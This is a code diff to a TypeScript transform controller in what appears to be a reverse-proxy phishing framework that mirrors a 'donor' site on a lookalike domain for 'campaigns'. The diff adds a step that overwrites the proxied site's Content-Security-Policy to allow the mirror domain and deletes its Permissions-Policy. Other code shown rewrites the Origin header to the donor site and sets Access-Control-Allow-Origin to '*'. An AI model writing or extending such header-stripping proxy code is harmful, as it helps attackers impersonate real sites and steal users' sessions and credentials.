@@ -1,6 +1,5 @@
 import { DIContainer } from '@famir/common'
-import { EnabledFullTargetModel } from '@famir/database'
-import { HTTP_SERVER_ROUTER, HttpServerContext, HttpServerRouter } from '@famir/http-server'
+import { HTTP_SERVER_ROUTER, HttpServerRouter } from '@famir/http-server'
 import { Logger, LOGGER } from '@famir/logger'
 import { Validator, VALIDATOR } from '@famir/validator'
 import { BaseController } from '../base/index.js'
@@ -33,6 +32,7 @@ export class TransformController extends BaseController {
   useAll() {
     this.useBasic()
     this.useFixCors()
+    this.useFixCsp()
     this.useRewriteUrl()
   }
 
@@ -56,6 +56,12 @@ export class TransformController extends BaseController {
           cookies[campaign.sessionCookieName] = undefined
           message.requestHeaders.setCookies(cookies)
         }
+
+        //if (message.requestHeaders.has('Upgrade-Insecure-Requests')) {
+        //  if (!target.mirrorSecure) {
+        //    message.requestHeaders.delete('Upgrade-Insecure-Requests')
+        //  }
+        //}
 
         message.requestHeaders.delete([
           'Via',
@@ -88,11 +94,7 @@ export class TransformController extends BaseController {
 
       message.addRequestHeadInterceptor('transform-fix-cors', () => {
         if (message.requestHeaders.has('Origin')) {
-          const donorOrigin = [
-            target.donorProtocol,
-            '//',
-            target.donorHost
-          ].join('')
+          const donorOrigin = [target.donorProtocol, '//', target.donorHost].join('')
 
           message.requestHeaders.set('Origin', donorOrigin)
         }
@@ -101,6 +103,29 @@ export class TransformController extends BaseController {
       message.addResponseHeadInterceptor('transform-fix-cors', () => {
         if (message.responseHeaders.has('Access-Control-Allow-Origin')) {
           message.responseHeaders.set('Access-Control-Allow-Origin', '*')
+        }
+      })
+
+      await next()
+    })
+  }
+
+  useFixCsp() {
+    this.router.register('transform-fix-csp', async (ctx, next) => {
+      const campaign = this.getState(ctx, 'campaign')
+      const target = this.getState(ctx, 'target')
+      const message = this.getState(ctx, 'message')
+
+      message.addResponseHeadInterceptor('transform-fix-csp', () => {
+        if (message.responseHeaders.has('Content-Security-Policy')) {
+          message.responseHeaders.set(
+            'Content-Security-Policy',
+            `default-src 'self' *.${target.mirrorDomain} ${target.mirrorDomain};`
+          )
+        }
+
+        if (message.responseHeaders.has('Permissions-Policy')) {
+          message.responseHeaders.delete('Permissions-Policy')
         }
       })
 
